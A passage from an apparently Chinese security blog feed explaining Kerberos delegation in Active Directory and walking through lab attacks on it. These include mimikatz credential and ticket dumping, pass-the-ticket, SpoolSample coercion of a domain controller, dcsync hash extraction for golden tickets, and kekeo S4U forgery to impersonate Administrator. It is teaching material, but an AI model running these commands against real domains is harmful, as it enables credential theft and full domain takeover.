&lt;li&gt;&lt;strong&gt;用户发送TGS、TGT1、TGT2和TGT2的SessionKey给服务1&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;服务1通过用户的TGT2请求KDC，以用户名义请求服务2的TGS（服务访问票据）&lt;/li&gt;
&lt;li&gt;KDC给服务1返回服务2的TGS&lt;/li&gt;
&lt;li&gt;服务1以用户名义向服务2发出请求&lt;/li&gt;
&lt;li&gt;服务2响应服务1的请求&lt;/li&gt;
&lt;li&gt;服务1响应用户第7步骤的请求&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;其中&lt;code&gt;TGT2&lt;/code&gt;是不被限制的，服务1完全可以用它来请求访问任何想访问的服务。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本质：用户 A 去访问服务B，服务 B 的服务账户开启了非约束委派，那么当用户 A 访问服务 B 的时候会将用户 A 的 TGT 发送给服务 B 并保存进内存，服务 B 能够利用用户 A 的身份去访问用户 A 能够访问的任意服务。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;查找委派账号，开启委派后，在该用户的 &lt;code&gt;userAccountControl&lt;/code&gt; 属性中会包含&lt;code&gt;TRUSTED_FOR_DELEGATION&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 533; 
			flex-basis: 1280px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313145503582.png&#34; data-size=&#34;1110x208&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313145503582.png&#34;
			width=&#34;1110&#34;
			height=&#34;208&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313145503582_huffa05800b7caecc26a8d9f0f1ce5a94d_103859_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313145503582_huffa05800b7caecc26a8d9f0f1ce5a94d_103859_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;实战&#34;&gt;实战&lt;/h3&gt;
&lt;h4 id=&#34;非约束委派查找&#34;&gt;非约束委派查找&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;adfind&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;基于LDAP服务。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询非约束委派的主机&lt;/strong&gt;：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;AdFind.exe -b &amp;quot;DC=pentest,DC=com&amp;quot; -f &amp;quot;(&amp;amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&amp;quot; cn distinguishedName
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 237; 
			flex-basis: 568px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313153811163.png&#34; data-size=&#34;1114x470&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313153811163.png&#34;
			width=&#34;1114&#34;
			height=&#34;470&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313153811163_huc2beeb3493d89c8b865bafe3e328bd67_198961_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313153811163_huc2beeb3493d89c8b865bafe3e328bd67_198961_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询非约束委派的用户&lt;/strong&gt;：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;AdFind.exe -b &amp;quot;DC=pentest,DC=com&amp;quot; -f &amp;quot;(&amp;amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&amp;quot; cn distinguishedName
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;powerview&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;查询配置非约束委派的用户&lt;/strong&gt;：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Get-NetUser -Unconstrained -Domain pentest.com
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;查询配置非约束委派的主机&lt;/strong&gt;：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Get-domaincomputer -Unconstrained -Domain pentest.com
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 152; 
			flex-basis: 366px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313154620096.png&#34; data-size=&#34;1112x729&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313154620096.png&#34;
			width=&#34;1112&#34;
			height=&#34;729&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313154620096_hu08eadd8fb1ff64dac779f7eebd49df36_420208_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313154620096_hu08eadd8fb1ff64dac779f7eebd49df36_420208_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PowerShell脚本枚举域内所有的服务账号，查看哪些账号被设置委派，以及何种类型的委派：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Get-DomainUser -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto | f1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当一个用户具备对某个服务账号的SeEnableDelegationPrivilege权限时，表示可以更改服务账号的委派设置，一般情况下只有域管理员才具备这个权限。因此也可以利用SeEnableDelegationPrivilege属性，制作极其隐蔽的后门。&lt;/p&gt;
&lt;h4 id=&#34;利用-管理员模拟访问&#34;&gt;利用-管理员模拟访问&lt;/h4&gt;
&lt;p&gt;当域管理员访问目标服务账号，且该服务账号配置了非约束性委派，那么域管理员会将自己的TGT发送给该服务，并保留在机器内存中，因此攻击者可提取这台机器上缓存的TGT，从而获得域管权限，随后进行PTT攻击即可。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;模拟管理员调用非约束性委派机的 smb 服务：&lt;code&gt;net use \\win7\c$&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;在非约束性委派机上查看票据&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;privilege::debug
sekualsa::tickets
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 134; 
			flex-basis: 321px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313162551262.png&#34; data-size=&#34;1030x768&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313162551262.png&#34;
			width=&#34;1030&#34;
			height=&#34;768&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313162551262_hufa2e5439527aed45cccab9366d7b0ff6_289590_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313162551262_hufa2e5439527aed45cccab9366d7b0ff6_289590_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;导出票据&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sekurlas::tickets /export
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 183; 
			flex-basis: 440px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313163303229.png&#34; data-size=&#34;646x352&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313163303229.png&#34;
			width=&#34;646&#34;
			height=&#34;352&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313163303229_hu503eda8f3cd3f7b947e804149256ec34_284910_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313163303229_hu503eda8f3cd3f7b947e804149256ec34_284910_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当前状况下访问域控会被拒绝&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 840; 
			flex-basis: 2018px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313163355791.png&#34; data-size=&#34;513x61&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313163355791.png&#34;
			width=&#34;513&#34;
			height=&#34;61&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313163355791_hu6c60917cad7f5463abd7c1cc3b46473d_11656_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313163355791_hu6c60917cad7f5463abd7c1cc3b46473d_11656_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mimikatz 将票据注入内存&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;kerberos::ptt 票据文件名
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 196; 
			flex-basis: 471px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313163834084.png&#34; data-size=&#34;962x490&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313163834084.png&#34;
			width=&#34;962&#34;
			height=&#34;490&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313163834084_hud45c8b68877ed228a6cdc879414fa11f_167839_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313163834084_hud45c8b68877ed228a6cdc879414fa11f_167839_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;利用-spooler-printer-bug&#34;&gt;利用-Spooler Printer Bug&lt;/h4&gt;
&lt;p&gt;实际情况下，管理员不一定会访问非约束委派服务，留下TGT。可利用非约束委派 + Spooler 打印机服务可以强制指定的主机进行连接。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;原理：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;利用 Windows 打印系统远程协议 &lt;code&gt;(MS-RPRN)&lt;/code&gt; 中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRN &lt;code&gt;RpcRemoteFindFirstPrinterChangeNotification(Ex)&lt;/code&gt; 方法强制任何运行了 &lt;code&gt;Spooler&lt;/code&gt; 服务的计算机以通过 &lt;code&gt;Kerberos&lt;/code&gt; 或 &lt;code&gt;NTLM&lt;/code&gt; 对攻击者选择的目标进行身份验证。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这种攻击需要找到一台开启非受限委派的主机账户，而非服务账户&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;POC：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/leechristensen/SpoolSample&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/leechristensen/SpoolSample&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用 &lt;code&gt;Rubeus&lt;/code&gt; 来监听 &lt;code&gt;Event ID&lt;/code&gt; 为 &lt;code&gt;4624&lt;/code&gt; 事件，即监听登录会话提取TGT&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Rubeus.exe monitor /interval:1 /filteruser:DC$
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;Rubeus.exe 捕获到的 TGT 是 base64 编码的，但是我们不需要解码，&lt;code&gt;Rubeus&lt;/code&gt;可以直接将 base64 编码的票据直接注入到内存中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;向 DC 的 &lt;code&gt;Spooler&lt;/code&gt; 服务发送请求，强制其访问 win7 进行身份验证&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;SpoolSample.exe DC win7
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;随后进行票据导出和注入&lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;dcsync&lt;/code&gt; 导出域控中所有用户的 hash，然后用 &lt;code&gt;krbtgt&lt;/code&gt; 用户的 hash 生成黄金票据&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;lsadump::dcsync /domain:test.local /all /csv
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;约束性委派&#34;&gt;约束性委派&lt;/h2&gt;
&lt;h3 id=&#34;原理-1&#34;&gt;原理&lt;/h3&gt;
&lt;p&gt;由于非约束委派的不安全性（配置了非约束委派的机器在 LSASS 中缓存了用户的 TGT 票据可模拟用户去访问域中任意服务），微软在 Windows Server 2003 中引入了约束委派，对 Kerberos 协议进行拓展，引入了 &lt;code&gt;S4U&lt;/code&gt; (S4U2Self / S4U2proxy)。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;S4U2self&lt;/code&gt; (Service for User to S4U2Self) 可以代表自身请求针对其自身的 Kerberos 服务票据(ST)；如果一个&lt;strong&gt;服务账户&lt;/strong&gt;的 userAccountControl 标志为 &lt;code&gt;TRUSTED_TO_AUTH_FOR_DELEGATION&lt;/code&gt;, 则其可以&lt;strong&gt;代表任何其他用户&lt;/strong&gt;获取自身服务的 TGS/ST。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;S4U2proxy&lt;/code&gt;(Service for User to Proxy) 可以以用户的名义请求其它服务的 ST，限制了 S4U2proxy 扩展的范围。服务帐户可以&lt;strong&gt;代表任何用户&lt;/strong&gt;获取在 &lt;code&gt;msDS-AllowedToDelegateTo&lt;/code&gt; 中设置的服务的 TGS/ST，首先需要从该用户到其本身的 TGS/ST，但它可以在请求另一个 TGS 之前使用 S4U2self 获得此 TGS/ST。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;约束委派的目的是在模拟用户的同时，限制委派机器/帐户对特定服务的访问。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 131; 
			flex-basis: 315px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313170602409.png&#34; data-size=&#34;1049x797&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313170602409.png&#34;
			width=&#34;1049&#34;
			height=&#34;797&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313170602409_hu6cd6bf83e00028a0daf95b4c51005530_169600_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313170602409_hu6cd6bf83e00028a0daf95b4c51005530_169600_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;S4U2self&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户向 service1 发送请求。用户已通过身份验证，但 service1 没有用户的授权数据。通常，这是由于身份验证是通过 Kerberos 以外的其他方式验证的。&lt;/li&gt;
&lt;li&gt;通过 S4U2self 扩展以用户的名义向 KDC 请求用于访问 service1 的 ST1。&lt;/li&gt;
&lt;li&gt;KDC 返回给 service1 一个用于用户验证 service1 的 ST1，该 ST1 可能包含用户的授权数据。&lt;/li&gt;
&lt;li&gt;service1 可以使用 ST 中的授权数据来满足用户的请求，然后响应用户。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;尽管 S4U2self 向 service1 提供有关用户的信息，但 S4U2self 不允许 service1 代表用户发出其他服务的请求，这时候就轮到 S4U2proxy 发挥作用了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;S4U2proxy&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户向 service1 发送请求，service1 需要以用户身份访问 service2 上的资源。&lt;/li&gt;
&lt;li&gt;service1 以用户的名义向 KDC 请求用户访问 service 2的 ST2。&lt;/li&gt;
&lt;li&gt;如果请求中包含 PAC，则 KDC 通过检查 PAC 的签名数据来验证 PAC ，如果 PAC 有效或不存在，则 KDC 返回 ST2 给 service1，但存储在 ST2 的 cname 和 crealm 字段中的客户端身份是用户的身份，而不是 service1 的身份。&lt;/li&gt;
&lt;li&gt;service1 使用 ST2 以用户的名义向 service2 发送请求，并判定用户已由 KDC 进行身份验证。&lt;/li&gt;
&lt;li&gt;service2 响应步骤 8 的请求。&lt;/li&gt;
&lt;li&gt;service1 响应用户对步骤 5 中的请求。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当被设置为&lt;code&gt;约束性委派&lt;/code&gt;时，其 &lt;code&gt;userAccountControl&lt;/code&gt; 属性包含 &lt;code&gt;TRUSTED_TO_AUTH_FOR_DELEGATION(T2A4D)&lt;/code&gt;，且 &lt;code&gt;msDS-AllowedToDelegateTo&lt;/code&gt; 属性会被设置为&lt;strong&gt;某些特定协议&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 416; 
			flex-basis: 1000px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313145712428.png&#34; data-size=&#34;1538x369&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313145712428.png&#34;
			width=&#34;1538&#34;
			height=&#34;369&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313145712428_hu4316763a24b0544558b0819cb9c944ec_461420_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313145712428_hu4316763a24b0544558b0819cb9c944ec_461420_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;p&gt;如果 AD 中将用户标记为“帐户敏感且无法委派”，则无法模拟其身份。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;实战-1&#34;&gt;实战&lt;/h3&gt;
&lt;h4 id=&#34;约束委派查找&#34;&gt;约束委派查找&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;adfind&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;查询约束委派的主机&lt;/strong&gt;：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;AdFind.exe -b &amp;quot;DC=pentest,DC=com&amp;quot; -f &amp;quot;(&amp;amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&amp;quot; cn distinguishedName msds-allowedtodelegateto
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 217; 
			flex-basis: 522px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313172008723.png&#34; data-size=&#34;961x441&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313172008723.png&#34;
			width=&#34;961&#34;
			height=&#34;441&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313172008723_hua917f571d043ac5dd3f7b33f723f8a91_132491_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313172008723_hua917f571d043ac5dd3f7b33f723f8a91_132491_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询约束委派的用户&lt;/strong&gt;：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;AdFind.exe -b &amp;quot;DC=pentest,DC=com&amp;quot; -f &amp;quot;(&amp;amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&amp;quot; cn distinguishedName msds-allowedtodelegateto
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;powerview&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;查询约束委派的主机&lt;/strong&gt;：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Get-DomainComputer -TrustedToAuth -Domain test.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;查询约束委派的用户&lt;/strong&gt;：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Get-DomainUser –TrustedToAuth -domain qiyou.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;利用&#34;&gt;利用&lt;/h4&gt;
&lt;p&gt;已知在约束委派的情况下，服务用户只能获取某个用户或者主机的服务 ST，只能用模拟用户访问特定的服务，是无法获取用户的 TGT 的，如果能够获得到开启了约束委派的服务的用户的明文密码或者NTLM hash 就可以伪造 S4U 的请求，进而伪造服务用户以任意账户的权限访问服务的 ST。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;抓取主机账户或服务账户的NTLM值 或 以其他渠道(kerberosating攻击)获取到服务账户密码&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mimikatz.exe &amp;quot;privilege::debug&amp;quot; &amp;quot;sekurlsa::logonpasswords full&amp;quot; exit
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 244; 
			flex-basis: 585px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173322791.png&#34; data-size=&#34;920x377&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173322791.png&#34;
			width=&#34;920&#34;
			height=&#34;377&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173322791_hu910f4ad60bc64db3bea655d57a5c07a2_142762_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313173322791_hu910f4ad60bc64db3bea655d57a5c07a2_142762_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;申请TGT(如果已经有服务账户所在主机的权限，可以直接使用mimikatz从内存中把服务账户的TGT导出，从而省略申请TGT过程)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;kekeo.exe 

tgt::ask /user:win7$ /domain:pentest.com /ntlm:&amp;lt;抓取到的哈希&amp;gt;
tgt::ask /user:win7$ /domain:pentest.com /password:123456
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 354; 
			flex-basis: 850px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173558350.png&#34; data-size=&#34;1031x291&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173558350.png&#34;
			width=&#34;1031&#34;
			height=&#34;291&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173558350_hua65d29e8dc97382ceca4502be5127876_152634_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313173558350_hua65d29e8dc97382ceca4502be5127876_152634_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过 TGT，&lt;strong&gt;伪造S4U请求&lt;/strong&gt;一张以 &lt;code&gt;Administrator&lt;/code&gt; 用户身份访问对应服务 2（&lt;strong&gt;DC 的 cifs 服务&lt;/strong&gt;）的 ST&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tgs::s4u /tgt:TGT_win7$@PENTEST.COM_krbtgt~pentest.com@PENTEST.COM.kirbi /user:administrator@pentest.com /service:cifs/dc.pentest.com
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 211; 
			flex-basis: 508px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173703392.png&#34; data-size=&#34;1029x486&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173703392.png&#34;
			width=&#34;1029&#34;
			height=&#34;486&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173703392_hu8fc540308c8f69f6d52dd2721b6d8cb1_301206_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313173703392_hu8fc540308c8f69f6d52dd2721b6d8cb1_301206_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;S4U2Self&lt;/code&gt;获取到的 ST1 以及 &lt;code&gt;S4U2Proxy&lt;/code&gt; 获取到的 DC CIFS 服务的 ST2 会保存在当前目录下：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 664; 
			flex-basis: 1594px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173749451.png&#34; data-size=&#34;631x95&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173749451.png&#34;
			width=&#34;631&#34;
			height=&#34;95&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173749451_hu2950955962decbe43846c10d8088d13f_88135_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313173749451_hu2950955962decbe43846c10d8088d13f_88135_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mimikatz 注入ST2到当前会话&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;kerberos::ptt TGS_administrator@pentest.com@PENTEST.COM_cifs~dc.pentest.com@PENTEST.COM.kirbi
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;委派服务受限&#34;&gt;委派服务受限&lt;/h4&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 264; 
			flex-basis: 635px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313174247259.png&#34; data-size=&#34;643x243&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313174247259.png&#34;
			width=&#34;643&#34;
			height=&#34;243&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313174247259_hueb4a805464d01e767f6ccc3f1935e16a_88946_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313174247259_hueb4a805464d01e767f6ccc3f1935e16a_88946_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;当允许的服务不是CIFS服务，可以在 hex 模式下修改 ST2，将 time 修改为 cifs，即可通过 smbexec 执行命令。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Activemq 任意文件写入漏洞</title>
